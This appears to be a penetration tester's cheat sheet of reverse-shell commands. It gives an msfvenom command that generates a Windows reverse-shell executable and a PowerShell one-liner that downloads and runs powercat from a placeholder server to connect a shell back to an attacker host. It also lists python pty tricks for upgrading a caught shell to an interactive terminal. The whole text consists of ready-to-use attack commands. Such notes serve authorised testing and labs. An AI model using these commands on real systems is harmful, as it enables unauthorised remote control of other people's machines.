#### Shells

##### Windows
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o <filename.exe>
IEX (New-Object System.Net.Webclient).DownloadString("http://<server_ip>/powercat.ps1");powercat -c <host_ip> -p <port> -e powershell
```

#### Upgrades

```
#interactive upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'

#interactive upgrade
python3 -c 'import pty; pty.spawn(["env","TERM=xterm-256color","/bin/bash","--rcfile", "/etc/bash.bashrc","-i"])'

#enables clear
export TERM=xterm
```